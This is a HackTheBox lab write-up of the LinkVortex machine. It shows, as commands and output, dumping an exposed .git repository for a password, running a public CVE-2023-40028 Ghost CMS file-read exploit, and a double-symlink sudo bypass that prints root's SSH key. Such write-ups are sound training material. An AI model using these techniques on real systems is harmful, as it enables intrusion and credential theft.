---
render_with_liquid: false
title: HackTheBox Writeup - LinkVortex
date: 2024-12-10 21:38:32 +1400
tags: [hackthebox, nmap, linux, feroxbuster, gobuster, subdomain, ghost-cms, git, git-dumper, discover-secrets, gitleaks, user-enumeration, cve-2023-40028, file-read, docker, credentials-stuffing, sudo, bash-script, symlinks, oscp-like-2023]
image:
    path: https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png
    width: 640
    height: 480
---



LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed `.git` directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ pt init '10.10.11.47 linkvortex.htb dev.linkvortex.htb'
+------------+--------+-------------+--------------------+
|  PROFILE   | STATUS |     IP      |       DOMAIN       |
+------------+--------+-------------+--------------------+
| linkvortex | on     | 10.10.11.47 | linkvortex.htb     |
| linkvortex | on     | 10.10.11.47 | dev.linkvortex.htb |
+------------+--------+-------------+--------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Dec 10 21:38:32 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, linkvortex.htb
Nmap scan report for linkvortex.htb (10.129.155.178)
Host is up, received user-set (0.28s latency).
Scanned at 2024-12-10 21:38:32 CST for 21s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Dec 10 21:38:53 2024 -- 1 IP address (1 host up) scanned in 21.07 seconds
```


## 80 - HTTP : BitByBit Hardware


### Info

```ruby
http://linkvortex.htb [200] [BitByBit Hardware] [Apache] [86dadeafeec97e9ce7200e24a2db0a67cbcb751b] [Apache HTTP Server,Express,Ghost:5.58,Node.js,jQuery,jQuery CDN,jsDelivr]
```

![](/assets/obsidian/e2be233548e14411b6fc039e9e3f0248.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt -n
```

```bash
404      GET      188l      529w     7361c http://linkvortex.htb/webmentions/
200      GET        1l       27w     6743c http://linkvortex.htb/public/cards.min.js
200      GET        2l      157w    10332c http://linkvortex.htb/assets/built/casper.js
200      GET       22l      167w     1065c http://linkvortex.htb/LICENSE
200      GET        1l      583w    35739c http://linkvortex.htb/public/cards.min.css
404      GET      188l      529w     7361c http://linkvortex.htb/assets/built/
404      GET      188l      529w     7361c http://linkvortex.htb/public/
404      GET      188l      529w     7361c http://linkvortex.htb/text/
200      GET        2l      769w    39700c http://linkvortex.htb/assets/built/screen.css
404      GET      188l      529w     7361c http://linkvortex.htb/assets/
200      GET        2l       46w    25518c http://linkvortex.htb/favicon.ico
200      GET      307l      914w    12148c http://linkvortex.htb/
301      GET       10l       16w      179c http://linkvortex.htb/assets => http://linkvortex.htb/assets/
403      GET        7l       20w      199c http://linkvortex.htb/server-status
301      GET       10l       16w      183c http://linkvortex.htb/partials => http://linkvortex.htb/partials/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost) -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://linkvortex.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.linkvortex.htb Status: 200 [Size: 2538]
```

## 80 - dev.linkvortex.htb : Launching Soon


### Info

```ruby
http://dev.linkvortex.htb/ [200] [Launching Soon] [Apache] [0c12b09c72337ca17c3f17fa0e22da559826f399] [Apache HTTP Server]
```

![](/assets/obsidian/84e00eeadcce0245e5b03ba9488cba56.png)

### Directory

```bash
feroxbuster -w /usr/share/dirb/wordlists/common.txt -k --thorough -A -C 400,404,500 -u http://dev.linkvortex.htb
```

```bash
200      GET        1l        1w       41c http://dev.linkvortex.htb/.git/HEAD
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
200      GET      115l      255w     2538c http://dev.linkvortex.htb/index.html
```

# User Flag
---

## Shell as bob

### 80 - dev.linkvortex.htb : .git open directory

There's a a git fork of `https://github.com/TryGhost/Ghost.git` at http://dev.linkvortex.htb/, which might contain credentials in commits

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ curl http://dev.linkvortex.htb/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://github.com/TryGhost/Ghost.git
        fetch = +refs/tags/v5.58.0:refs/tags/v5.58.0
```

Dump the repository

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ git-dumper http://dev.linkvortex.htb/.git gitd-umper
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

### Hard coded credentials

Scan for secrets with **gitleaks**

```bash
gitleaks --no-banner detect -r gitleaks.json -v --no-git -s .
```

- Got a password `OctopiFociPilfer45`

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/gitd-umper]
└─$ cat gitleaks.json | jq .[] -c | grep -v 'Identified a Private Key' | jq '{File,Description,Match}'
{
  "File": "ghost/admin/app/components/dashboard/resources/newsletter.js",
  "Description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
  "Match": "API_KEY = 'b30afc1721f5d8d021ec3450ef'"
}
{
  "File": "ghost/admin/app/components/dashboard/resources/resources.js",
  "Description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
  "Match": "API_KEY = 'b30afc1721f5d8d021ec3450ef'"
}
{
  "File": "ghost/core/test/regression/api/admin/authentication.test.js",
  "Description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
  "Match": "password = 'OctopiFociPilfer45'"
}
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/gitd-umper]
└─$ grep OctopiFociPilfer45 ghost/core/test/regression/api/admin/authentication.test.js -E5
                });
        });

        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
                .get('/repos/tryghost/dawn/zipball')
                .query(true)
                .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));
```

By viewing some posts on the website, they were all published by `admin`, assume the login username is `admin@linkvortex`

> http://linkvortex.htb/psu/

![](/assets/obsidian/f0bd7254f0f08c58773100b8de5604db.png)

> http://linkvortex.htb/ghost/

- Login : `admin@linkvortex:OctopiFociPilfer45` 

![](/assets/obsidian/7812a20d903dd748671c628b659065ce.png)

![](/assets/obsidian/1c7e02619f7d94f222575a868e657543.png)


### 80 - Ghost CMS 5.58 : Arbitrary file read (CVE-2023-40028) (Authenticated)

- Google : `Ghost:5.58 exploit`

> POC - https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh

> **CVE-2023-40028**
> Ghost is an open source content management system. Versions prior to 5.59.1 are subject to a vulnerability which allows authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system. Site administrators can check for exploitation of this issue by looking for unknown symlinks within Ghost's `content/` folder. Version 5.59.1 contains a fix for this issue. All users are advised to upgrade. There are no known workarounds for this vulnerability.
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/exploit]
└─$ wget https://raw.githubusercontent.com/0xyassine/CVE-2023-40028/refs/heads/master/CVE-2023-40028.sh
--2024-12-11 19:52:41--  https://raw.githubusercontent.com/0xyassine/CVE-2023-40028/refs/heads/master/CVE-2023-40028.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2738 (2.7K) [text/plain]
Saving to: ‘CVE-2023-40028.sh’

CVE-2023-40028.sh                                    100%[===================================================================================================================>]   2.67K  --.-KB/s    in 0s

2024-12-11 19:52:41 (79.2 MB/s) - ‘CVE-2023-40028.sh’ saved [2738/2738]
```

Change the URL variable in the script

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/exploit]
└─$ sed -i 's/127.0.0.1/linkvortex.htb/g' CVE-2023-40028.sh
```

Start exploit

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/exploit]
└─$ bash CVE-2023-40028.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

- User `node` have a shell for login, **Ghost CMS** could be running as `node`

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ cat loot/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
```

- The private key does not exist

```bash
file> /home/node/.ssh/id_rsa
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
file> /root/.ssh/id_rsa
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
```

- We can still read `/home/node/.profile`, which means the web service is running as user `node`

```bash
file> /home/node/.profile

# ~/.profile: executed by the command interpreter for login shells.
[...]
```

- Password reuse doesn't work

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ cssh linkvortex.htb 'node' 'OctopiFociPilfer45'
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ cssh linkvortex.htb 'root' 'OctopiFociPilfer45'
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

- There's no `user.txt`, but `/.dockerenv` exists, which means it's in a docker container

```bash
file> /home/node/user.txt
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
```

```bash
file> /.dockerenv
file>
```

- From `Dockerfile`, we got the ghost config location

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex/gitd-umper]
└─$ cat Dockerfile.ghost
FROM ghost:5.58.0


# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json


# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb


# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

```bash
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

### 22 - Credential stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ cssh linkvortex.htb 'bob' 'fibber-talented-worth'
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Dec 12 06:46:27 2024 from 10.10.16.14
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@linkvortex:~$ cat user.txt
96f59f7d033b61f21559af0c5debc995
```

# Root Flag
---

## From bob to root


### SUDO - Bash script : Symlink abuse

```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

```bash
bob@linkvortex:~$ ls -la /opt/ghost/clean_symlink.sh
-rwxr--r-- 1 root root 745 Nov  1 08:46 /opt/ghost/clean_symlink.sh
```

- The script accepts only `.png` files as argument
- If the png file is **symlink**:
	- Path contains `etc` or `root`:
		- Remove the `.png` **symlink** file
	- Path doesn't contain `etc` or `root`, and `CHECK_CONTENT` is set to `true`:
		- Move the `.png` **symlink** file to `/var/quarantined` then show the content of **symlink** target

```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh

#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

- The **sudoers** rules have `env_keep+=CHECK_CONTENT`, we can set `CHECK_CONTENT=true` to view content of **symlink** targets
- The script doesn't use `readlink -f` to check **symlink** target recursively, hence we can make a **symlink** that points to `/root/.ssh/id_rsa` then make a second **symlink** point to the first **symlink** file to bypass the check

```bash
bob@linkvortex:~$ ln -sf /root/.ssh/id_rsa x.txt
bob@linkvortex:~$ ln -sf /home/bob/x.txt x.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh x.png
Link found [ x.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
TQ6pQUZxR4zqueIZ7yHVsw5j0eeqlF8OvHT81wbS5ozJBgtjxySWrRkkKAcY11tkTln6NK
CssRzP1r9kbmgHswClErHLL/CaBb/04g65A0xESAt5H1wuSXgmipZT8Mq54lZ4ZNMgPi53
jzZbaHGHACGxLgrBK5u4mF3vLfSG206ilAgU1sUETdkVz8wYuQb2S4Ct0AT14obmje7oqS
0cBqVEY8/m6olYaf/U8dwE/w9beosH6T7arEUwnhAAAFiDyG/Tk8hv05AAAAB3NzaC1yc2
EAAAGBAJqR1YVddTFu3hrfVnidt61bqpVpzKRfhXJVmMKeEgAnAIpWXThfE6tnoGH3jJoC
PSKDNA3cgykuLxvpSKFqCRH2X/nFcGmSM02cCpuxAmxdjsvrtkg/l+5RvQOldcZJloUFhL
woiNtlIyKBZCNKDnw65umUE8mRffQKgVXMBgoxAOu3hCrf+aHozeWIC+yKburCqTE4VHLW
KVp8wHOMgTf5mr4WO7+fkxFdBcz2GSdrKaHgdzhgXFTc0i+NXLToqhlWe8l00OqUFGcUeM
6rniGe8h1bMOY9HnqpRfDrx0/NcG0uaMyQYLY8cklq0ZJCgHGNdbZE5Z+jSgrLEcz9a/ZG
5oB7MApRKxyy/wmgW/9OIOuQNMREgLeR9cLkl4JoqWU/DKueJWeGTTID4ud482W2hxhwAh
sS4KwSubuJhd7y30httOopQIFNbFBE3ZFc/MGLkG9kuArdAE9eKG5o3u6KktHAalRGPP5u
qJWGn/1PHcBP8PW3qLB+k+2qxFMJ4QAAAAMBAAEAAAGABtJHSkyy0pTqO+Td19JcDAxG1b
O22o01ojNZW8Nml3ehLDm+APIfN9oJp7EpVRWitY51QmRYLH3TieeMc0Uu88o795WpTZts
ZLEtfav856PkXKcBIySdU6DrVskbTr4qJKI29qfSTF5lA82SigUnaP+fd7D3g5aGaLn69b
qcjKAXgo+Vh1/dkDHqPkY4An8kgHtJRLkP7wZ5CjuFscPCYyJCnD92cRE9iA9jJWW5+/Wc
f36cvFHyWTNqmjsim4BGCeti9sUEY0Vh9M+wrWHvRhe7nlN5OYXysvJVRK4if0kwH1c6AB
VRdoXs4Iz6xMzJwqSWze+NchBlkUigBZdfcQMkIOxzj4N+mWEHru5GKYRDwL/sSxQy0tJ4
MXXgHw/58xyOE82E8n/SctmyVnHOdxAWldJeycATNJLnd0h3LnNM24vR4GvQVQ4b8EAJjj
rF3BlPov1MoK2/X3qdlwiKxFKYB4tFtugqcuXz54bkKLtLAMf9CszzVBxQqDvqLU9NAAAA
wG5DcRVnEPzKTCXAA6lNcQbIqBNyGlT0Wx0eaZ/i6oariiIm3630t2+dzohFCwh2eXS8nZ
VACuS94oITmJfcOnzXnWXiO+cuokbyb2Wmp1VcYKaBJd6S7pM1YhvQGo1JVKWe7d4g88MF
Mbf5tJRjIBdWS19frqYZDhoYUljq5ZhRaF5F/sa6cDmmMDwPMMxN7cfhRLbJ3xEIL7Kxm+
TWYfUfzJ/WhkOGkXa3q46Fhn7Z1q/qMlC7nBlJM9Iz24HAxAAAAMEAw8yotRf9ZT7intLC
+20m3kb27t8TQT5a/B7UW7UlcT61HdmGO7nKGJuydhobj7gbOvBJ6u6PlJyjxRt/bT601G
QMYCJ4zSjvxSyFaG1a0KolKuxa/9+OKNSvulSyIY/N5//uxZcOrI5hV20IiH580MqL+oU6
lM0jKFMrPoCN830kW4XimLNuRP2nar+BXKuTq9MlfwnmSe/grD9V3Qmg3qh7rieWj9uIad
1G+1d3wPKKT0ztZTPauIZyWzWpOwKVAAAAwQDKF/xbVD+t+vVEUOQiAphz6g1dnArKqf5M
SPhA2PhxB3iAqyHedSHQxp6MAlO8hbLpRHbUFyu+9qlPVrj36DmLHr2H9yHa7PZ34yRfoy
+UylRlepPz7Rw+vhGeQKuQJfkFwR/yaS7Cgy2UyM025EEtEeU3z5irLA2xlocPFijw4gUc
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ vi loot/root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ chmod 600 ./loot/root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/LinkVortex]
└─$ ssh -i ./loot/root.id_rsa root@linkvortex.htb
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Dec 12 08:44:35 2024 from 10.10.14.88
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~# cat root.txt
9f5bf96c954289789cabaa66db94cfda
```

# Additional
---
